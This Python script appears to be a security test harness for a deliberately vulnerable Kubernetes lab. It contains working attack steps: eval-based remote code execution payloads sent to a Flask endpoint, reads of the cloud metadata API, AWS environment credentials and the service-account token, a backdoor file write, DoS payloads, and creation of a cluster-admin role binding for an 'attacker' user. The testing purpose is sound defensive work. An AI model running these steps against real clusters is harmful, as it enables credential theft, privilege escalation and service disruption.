#!/usr/bin/env python3

import subprocess
import json
from kubernetes import client, config
from kubernetes.stream import stream

NAMESPACE = "default"

ATTACK_RESULTS = []


def log(test, status, details=""):
    ATTACK_RESULTS.append({
        "test": test,
        "status": status,
        "details": details
    })
    print(f"[{status}] {test} -> {details}")


def get_pod(name):
    v1 = client.CoreV1Api()
    pods = v1.list_namespaced_pod(NAMESPACE)

    for p in pods.items:
        if name in p.metadata.name:
            return p.metadata.name
    return None


def exec_in_pod(pod, command):
    v1 = client.CoreV1Api()

    try:
        resp = stream(
            v1.connect_get_namespaced_pod_exec,
            pod,
            NAMESPACE,
            command=["/bin/sh", "-c", command],
            stderr=True,
            stdin=False,
            stdout=True,
            tty=False,
        )
        return resp
    except Exception as e:
        return str(e)


# ----------------------------
# Attack Tests
# ----------------------------

def test_list_secrets():
    try:
        v1 = client.CoreV1Api()
        secrets = v1.list_namespaced_secret(NAMESPACE)
        log("List Kubernetes secrets", "SUCCESS",
            f"Found {len(secrets.items)} secrets")
    except Exception as e:
        log("List Kubernetes secrets", "BLOCKED", str(e))


def test_metadata_api(pod):
    output = exec_in_pod(pod, "curl -s http://169.254.169.254/latest/meta-data/ || true")

    if output.strip():
        log("Instance Metadata API access", "SUCCESS", output[:200])
    else:
        log("Instance Metadata API access", "BLOCKED", "No response")


def test_kubelet_api(pod):
    cmd = "curl -k https://127.0.0.1:10250/pods || true"
    output = exec_in_pod(pod, cmd)

    if "pod" in output.lower():
        log("Access Kubelet API", "SUCCESS", output[:200])
    else:
        log("Access Kubelet API", "BLOCKED", output[:200])


def test_data_collection(pod):
    output = exec_in_pod(pod, "ls -la / || true")

    if output:
        log("Collect data from pod", "SUCCESS", output[:200])
    else:
        log("Collect data from pod", "FAILED")


def test_cloud_credentials(pod):
    cmd = "env | grep -i aws || true"
    output = exec_in_pod(pod, cmd)

    if output.strip():
        log("Using cloud credentials", "SUCCESS", output)
    else:
        log("Using cloud credentials", "BLOCKED", "No credentials found")


def test_dos(pod):
    cmd = "yes > /dev/null &"
    exec_in_pod(pod, cmd)
    log("Denial of Service attempt", "EXECUTED", "CPU stress started")


def test_proxy_egress(pod):
    cmd = "curl -s https://example.com || true"
    output = exec_in_pod(pod, cmd)

    if output:
        log("Connect from proxy server / egress", "SUCCESS")
    else:
        log("Connect from proxy server / egress", "BLOCKED")
        
def test_rce_vulnerability_fixed(attacker_pod, server_ip):
    cmd_payload = "__import__('os').popen('uname -a').read()"
    url = f"http://{server_ip}:5000/run?cmd={cmd_payload}"
    attack_cmd = f"curl -s '{url}'"
    output = exec_in_pod(attacker_pod, attack_cmd)
    if "Linux" in output:
        log("Remote Code Execution (eval)", "SUCCESS", f"Output: {output.strip()}")
    else:
        log("Remote Code Execution (eval)", "BLOCKED", "Could not execute code")
        
def test_token_theft(pod):
    token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
    cmd = f"cat {token_path} || echo 'Permission Denied'"
    output = exec_in_pod(pod, cmd)

    if "Permission Denied" in output or "No such file" in output:
        log("Service Account Token Access", "BLOCKED", "Token is protected or missing")
    else:
        log("Service Account Token Access", "SUCCESS", "Token successfully read")
        
def test_env_disclosure_fixed(attacker_pod, server_ip):
    cmd_payload = "__import__('os').environ.items()"
    url = f"http://{server_ip}:5000/run?cmd={cmd_payload}"
    attack_cmd = f"curl -s '{url}'"
    output = exec_in_pod(attacker_pod, attack_cmd)
    if "PATH" in output:
        log("System Info Disclosure (ENV)", "SUCCESS", "Environment variables leaked")
    else:
        log("System Info Disclosure (ENV)", "BLOCKED", "Data protected")
        
def test_memory_dos_fixed(attacker_pod, server_ip):
    cmd_payload = "['x']*100000000"
    url = f"http://{server_ip}:5000/run?cmd={cmd_payload}"
    attack_cmd = f"curl -s --max-time 5 '{url}'"
    output = exec_in_pod(attacker_pod, attack_cmd)
    if "Empty reply" in output or "500" in output:
        log("Memory Exhaustion DoS", "SUCCESS", "Service unresponsive")
    else:
        log("Memory Exhaustion DoS", "BLOCKED", "Service stable")
        
def test_root_privileges(pod):
    # Check current user ID
    output = exec_in_pod(pod, "id -u")
    if output.strip() == "0":
        log("Root Execution Check", "SUCCESS", "Container is running as ROOT (UID 0)")
    else:
        log("Root Execution Check", "BLOCKED", f"Container is running as non-root (UID: {output.strip()})")
        
def test_audit_logging(server_pod, server_ip):
    # Send a suspicious request
    cmd_payload = "print('Audit Test')"
    url = f"http://{server_ip}:5000/run?cmd={cmd_payload}"
    exec_in_pod(get_pod("exploit-client"), f"curl -s '{url}'")
    
    # Check if application logs exist (common paths)
    output = exec_in_pod(server_pod, "ls /app/logs || ls /var/log/flask.log || echo 'No logs found'")
    if "No logs found" in output:
        log("Audit Logging Presence", "FAILED", "No application logs found on server")
    else:
        log("Audit Logging Presence", "SUCCESS", "Log files detected")
        
def test_debug_exposure(server_ip):
    # Sending invalid python code to trigger a 500 error
    url = f"http://{server_ip}:5000/run?cmd=1/0"
    output = exec_in_pod(get_pod("exploit-client"), f"curl -s '{url}'")
    
    if "ZeroDivisionError" in output and "File \"app.py\"" in output:
        log("Debug Info Exposure", "SUCCESS", "Full stack trace leaked in response")
    else:
        log("Debug Info Exposure", "BLOCKED", "Internal error details are hidden")
        

def test_lateral_movement(pod):
    # Trying to reach the Kubernetes API service internally
    cmd = "curl -k -s https://kubernetes.default.svc || echo 'Connection Failed'"
    output = exec_in_pod(pod, cmd)
    
    if "Unauthorized" in output or "kind" in output:
        log("Lateral Movement (K8s API)", "SUCCESS", "Can reach internal K8s API service")
    else:
        log("Lateral Movement (K8s API)", "BLOCKED", "Internal service access restricted")
        
def test_filesystem_persistence(pod):
    # Try to write a 'backdoor' script in the app directory
    cmd = "echo 'print(\"Backdoor Active\")' > /app/backdoor.py && ls /app/backdoor.py"
    output = exec_in_pod(pod, cmd)
    
    if "backdoor.py" in output:
        log("Filesystem Persistence", "SUCCESS", "Writable directory found, backdoor created")
        # Cleanup
        exec_in_pod(pod, "rm /app/backdoor.py")
    else:
        log("Filesystem Persistence", "BLOCKED", "Application directory is read-only")

def test_reverse_shell_connectivity(pod):
    # Try to connect to an external port (simulating reverse shell)
    # Using a common port like 4444
    cmd = "nc -zv -w 3 google.com 80 || echo 'Egress Blocked'"
    output = exec_in_pod(pod, cmd)
    
    if "open" in output.lower() or "succeeded" in output.lower():
        log("Reverse Shell Connectivity", "SUCCESS", "Outbound network access allowed")
    else:
        log("Reverse Shell Connectivity", "BLOCKED", "Egress traffic restricted")
        
def test_malicious_module_import(server_ip):
    # Trying to import 'pickle' or 'subprocess' via eval
    cmd_payload = "__import__('pickle').__name__"
    url = f"http://{server_ip}:5000/run?cmd={cmd_payload}"
    output = exec_in_pod(get_pod("exploit-client"), f"curl -s '{url}'")
    
    if "pickle" in output:
        log("Malicious Module Import", "SUCCESS", "Can dynamically import restricted modules")
    else:
        log("Malicious Module Import", "BLOCKED", "Module import failed")
        
def test_cpu_exhaustion_dos(server_ip):
    # Sending a heavy PBKDF2 hashing operation
    cmd_payload = "__import__('hashlib').pbkdf2_hmac('sha256', b'a'*1000, b's', 1000000)"
    url = f"http://{server_ip}:5000/run?cmd={cmd_payload}"
    # Setting a short timeout to see if the server hangs
    attack_cmd = f"curl -s --max-time 3 '{url}'"
    output = exec_in_pod(get_pod("exploit-client"), attack_cmd)

    if output == "" or "timeout" in output:
        log("CPU Exhaustion DoS", "SUCCESS", "Server became unresponsive during heavy computation")
    else:
        log("CPU Exhaustion DoS", "BLOCKED", "Server handled or limited the request")
        
def test_header_info_leakage(server_ip):
    # Get HTTP headers
    cmd = f"curl -I -s http://{server_ip}:5000/run"
    output = exec_in_pod(get_pod("exploit-client"), cmd)
    
    if "Werkzeug" in output or "Flask" in output:
        log("Framework Info Leakage", "SUCCESS", "Framework versions found in headers")
    else:
        log("Framework Info Leakage", "BLOCKED", "Sensitive headers are stripped")
        


def test_cluster_admin_binding():
    rbac = client.RbacAuthorizationV1Api()

    body = client.V1ClusterRoleBinding(
        metadata=client.V1ObjectMeta(name="attack-test-binding"),
        role_ref=client.V1RoleRef(
            api_group="rbac.authorization.k8s.io",
            kind="ClusterRole",
            name="cluster-admin"
        ),
        subjects=[
            client.V1Subject(
                kind="User",
                name="attacker",
                api_group="rbac.authorization.k8s.io"
            )
        ]
    )

    try:
        rbac.create_cluster_role_binding(body)
        log("Cluster-admin binding", "SUCCESS")
    except Exception as e:
        log("Cluster-admin binding", "BLOCKED", str(e))


# ----------------------------
# Main
# ----------------------------

def main():

    config.load_kube_config()
    v1 = client.CoreV1Api()

    client_pod = get_pod("exploit-client")
    server_pod = get_pod("vuln-server")

    if not client_pod or not server_pod:
        print("Pods not found")
        return
    
    try:
        server_pod_data = v1.read_namespaced_pod(server_pod, NAMESPACE)
        server_ip = server_pod_data.status.pod_ip
    except Exception as e:
        print(f"Error fetching server IP: {e}")
        return

    print("Target pods:")
    print("Client:", client_pod)
    print("Server:", server_pod)

    # attacks
    test_list_secrets()
    test_cluster_admin_binding()
    test_token_theft(server_pod)
    test_root_privileges(server_pod)

    test_metadata_api(client_pod)
    test_kubelet_api(client_pod)
    test_cloud_credentials(client_pod)
    
    test_rce_vulnerability_fixed(client_pod, server_ip)
    test_filesystem_persistence(server_pod)
    test_lateral_movement(server_pod)                   
    test_reverse_shell_connectivity(server_pod)         
    test_env_disclosure_fixed(client_pod, server_ip)
    test_debug_exposure(server_ip)

    test_data_collection(server_pod)
    test_proxy_egress(client_pod)
    test_memory_dos_fixed(client_pod, server_ip)
    test_audit_logging(server_pod, server_ip)
    test_dos(client_pod)
    
    test_malicious_module_import(server_ip)
    test_cpu_exhaustion_dos(server_ip)
    test_header_info_leakage(server_ip)

    with open("attack_test_results.json", "w") as f:
        json.dump(ATTACK_RESULTS, f, indent=2)
        


if __name__ == "__main__":
    main()